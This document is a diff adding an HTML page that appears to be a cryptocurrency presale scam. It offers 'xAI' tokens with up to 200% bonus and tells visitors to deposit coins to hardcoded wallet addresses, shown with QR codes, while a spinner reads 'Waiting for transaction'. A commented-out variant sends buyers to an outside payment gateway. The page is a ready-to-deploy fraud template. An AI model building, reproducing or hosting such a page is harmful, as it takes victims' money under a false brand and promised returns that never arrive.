@@ -1,0 +1,312 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<link rel="shortcut icon" href="#">
+	<link href="../../css2-1?family=Kanit:wght@500&amp;display=swap" rel="stylesheet">
+	<link href="../../css2-2?family=Heebo:wght@600&amp;display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="assets/css/swap.css">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="apple-touch-icon-precomposed" href="assets/images/logo/favicon.png">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href="../../ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
+	<title>Pre-Purchase xAI tokens</title>
+</head>
+
+<body>
+    
+
+    
+	<div class="overlay hidden">
+		<div class="overlay-header">
+			<h4>Select a token</h4>
+			<p class="close">X</p>
+		</div>
+		<hr>
+		<div class="list">
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle0" src="assets/img/btc.png">
+				</div>
+				<div class="crypto-text">
+					<h5>BTC</h5>
+				</div>
+			</div>
+			<p>Bitcoin</p>
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle1" src="assets/img/bnb.png">
+				</div>
+				<div class="crypto-text">
+					<h5>BNB</h5>
+				</div>
+			</div>
+			<p>Binance</p>
+						<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle2" src="assets/img/eth.png">
+				</div>
+				<div class="crypto-text">
+					<h5>USDT</h5>
+				</div>
+			</div>
+			<p>USDT - ERC20</p>
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle3" src="assets/img/xrp.png">
+				</div>
+				<div class="crypto-text">
+					<h5>XRP</h5>
+				</div>
+			</div>
+			<p>Ripple</p>
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle4" src="assets/img/eth.png">
+				</div>
+				<div class="crypto-text">
+					<h5>ETH</h5>
+				</div>
+			</div>
+			<p>Ether</p>
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle5" src="assets/img/ada.png">
+				</div>
+				<div class="crypto-text">
+					<h5>ADA</h5>
+				</div>
+			</div>
+			<p>Cardano</p>
+			<div class="crypto-list">
+				<div class="list-image">
+					<img class="image-toggle6" src="assets/img/doge.png">
+				</div>
+				<div class="crypto-text">
+					<h5>DOGE</h5>
+				</div>
+			</div>
+			<p>DOGE</p>
+		</div>
+	</div>
+
+	<div class="body">
+		<div class="main-container">
+			
+			<div id="preswap">
+			
+			<div class="header">
+				<div class="header-left">
+					<h3><font color="#1582B9">xAI</font> SWAP</h3>
+					<br>
+					<p>Swap one of the accepted crypto currencies to xAI with up to <font color="lightgreen">200%</font> bonus.<br><br>
+					After the swap has been completed you will be redirected to the xAIwallet registration and setup.
+					During the Pre-Sale xAIwallets can only be activated with the purchase of xAI.</p>
+				
+					
+				</div>
+			</div>
+			<div class="second-container">
+				<img class="guide-arrow" src="assets/img/guide-arrow.png" alt="">
+				<div class="container-elements">
+					<div class="first-row">
+						<div class="row-left lefty">
+							<img class="almost" src="assets/img/btc.png">
+							<div class="row-left-text">
+								<p>Swap From:</p>
+								<h3 class="please" id="symbol">BTC</h3>
+							</div>
+							<div class="down-arrow">
+								<img src="assets/img/down-arrow.png">
+							</div>
+						</div>
+						<div class="row-right">
+							<input id="floatTextBox" inputmode="decimal" title="Token Amount" autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0" min="0" minlength="1" maxlength="79" spellcheck="false" class="sc-gojNiO bbUyug token-amount-input">
+						</div>
+					</div>
+					<div class="first-row">
+						<div class="row-left lefty">
+							<img class="almost2" src="assets/img/shib.png" alt="xAI">
+							<div class="row-left-text">
+								<p>Swap To:</p>
+								<h3 class="please2" id="convert">xAI</h3>
+							</div>
+						</div>
+						<div class="row-right">
+							<input readonly="" id="resultBox" inputmode="decimal" title="Token Amount" autocomplete="off" autocorrect="off" type="text" pattern="^[0-9]*[.,]?[0-9]*$" placeholder="0.0" min="0" minlength="1" maxlength="79" spellcheck="false" class="sc-gojNiO bbUyug token-amount-input">
+						</div>
+					</div>
+					<br>
+					<center>
+					<span style="font-family:Heebo;color:lightgreen;" id="bonus"></span>
+					<br><br>
+					<span style="font-family:Heebo;color:red;" id="addbonus"></span>
+					</center>
+					<hr>
+					<div class="wallet-btn">
+						<button id="sbut">Swap to xAI</button>
+					</div>
+				</div>
+			</div>
+		
+			</div>
+			
+			<div id="inswap" style="display:none;">
+			
+			<div class="header-left">
+				<img style="width:42px;" src="assets/img/shib.png"><h3 style="margin-left:55px;margin-top:-40px;">	 SWAP LAUNCHED</h3>
+				<br><br>
+				<p>Deposit <span id="amount">X</span> <span id="currency"></span> by using the QR code or copy the wallet address below.
+			</p>
+			</div>
+			<br><br><br>
+			<center>
+			
+			<img id="chartimg" style="width:200px;" src="assets/img/chart1.png">
+			
+			<br><br>
+			<div style="justify-content:center;display:flex;padding:10px;background-color:#2c2e34;border-radius:15px;width:280px;">
+			<span style="font-family:Heebo;font-size:12px;color:white;" id="walletid"> </span>
+			</div>
+			
+		
+			<div class="wallet-btn">
+						<button id="copybutton" style="padding:10px;width:180px;background-color:#1582B9;">COPY ADDRESS</button>
+					</div>
+			
+			<br>
+			<span style="font-family:Heebo;color:#fff;"><i class="fas fa-spinner fa-pulse"></i> Waiting for transaction...
+			<br><br> <br><font color="red"> PLEASE READ: </font>
+			
+				
+				<div style="background-color:#262626b0;padding-bottom:28px;margin-top:10px;"><br> <br>Once you've successfully deposited the funds, remain on this page until the transaction status changes to "completed."<br> Once marked as complete, you will be redirected to set up your xAI Wallet.
+				</div></span>
+			
+			</center>
+			
+			
+			
+			</div>
+		
+		
+		
+		</div>
+	</div>
+	
+
+
+
+
+
+	<script src="../../ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<script src="assets/js/numeric.js"></script>
+<script src="assets/js/popup.js"></script>
+<script src="assets/js/crypto.js"></script>
+
+<script>
+var enabled = 0;
+var scoin = 0;
+var depositvalue = 0;
+
+//define wallets
+let wallets = ["bc1qgh4l3l9vejygre5feft8qrrcmu4dmwpe82reag", 
+"0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8",
+"0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8",
+"r4MUDd7yqo7rY8675NX8DFRkZPp6MaStfh", 
+"0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8", 
+"addr1q9fuj26yundaukd670y7mvd0tggf4t8ywa9fn3cjm4yh5ry3pu5v4lrlltc200hpu844z8rk88nvuk7vt5efe23gkwdqp9hqvz",
+"DG55sUy2vsbqLsXqNYyU36C9HqbqW981j5"];
+
+let cname = ["BTC", 
+"BNB",
+"USDT",
+"XRP", 
+"ETH", 
+"ADA",
+"DOGE"];
+
+let QR = ["https://quickchart.io/qr?text=bc1qgh4l3l9vejygre5feft8qrrcmu4dmwpe82reag&margin=0&size=300&format=svg", 
+"https://quickchart.io/qr?text=0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8&margin=0&size=300&format=svg",
+"https://quickchart.io/qr?text=0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8&margin=0&size=300&format=svg",
+"https://quickchart.io/qr?text=r4MUDd7yqo7rY8675NX8DFRkZPp6MaStfh&margin=0&size=300&format=svg", 
+"https://quickchart.io/qr?text=0x1463356C55F1Dc73e0e0E5dbA0574DdE6bAecdD8&margin=0&size=300&format=svg", 
+"https://quickchart.io/qr?text=addr1q9fuj26yundaukd670y7mvd0tggf4t8ywa9fn3cjm4yh5ry3pu5v4lrlltc200hpu844z8rk88nvuk7vt5efe23gkwdqp9hqvz&margin=0&size=300&format=svg",
+"https://quickchart.io/qr?text=DG55sUy2vsbqLsXqNYyU36C9HqbqW981j5&margin=0&size=300&format=svg"];
+//enddefine
+
+
+    $("#sbut").click(function () {
+  if (enabled == 1) {
+$("#preswap").slideToggle();
+$("#inswap").slideToggle();
+document.getElementById("amount").innerHTML = depositvalue;
+document.getElementById("currency").innerHTML = cname[scoin-1];
+document.getElementById("walletid").innerHTML = wallets[scoin-1];
+document.getElementById("chartimg").src= QR[scoin-1];
+
+  }
+    });
+	
+ $("#copybutton").click(function () {	
+copy(wallets[scoin-1]);
+ });
+
+</script>
+
+<!--
+<script>
+var enabled = 0;
+var scoin = 0;
+var depositvalue = 0;
+
+//define wallets
+let wallets = ["x", 
+"x", 
+"x", 
+"x",
+"x", 
+"x"];
+
+let cname = ["BTC", 
+"BNB",
+"USDT",
+"XRP", 
+"ETH", 
+"ADA",
+"DOGE"];
+
+//enddefine
+
+
+
+    $("#sbut").click(function () {
+  if (enabled == 1) {
+
+  window.open("https://www.ecommercecoingate.com/?c=" + cname[scoin-1] + "&a=" + depositvalue + "&order=815336");
+
+  }
+    });
+	
+ $("#copybutton").click(function () {	
+copy(wallets[scoin-1]);
+ });
+
+</script>
+
+-->
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '7e9792a10a4e98f37dd10ffbc5cecde69714413d';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href="“https://www.smartsupp.com”" target="“_blank”">Smartsupp</a></noscript>
+</body>
+</html>
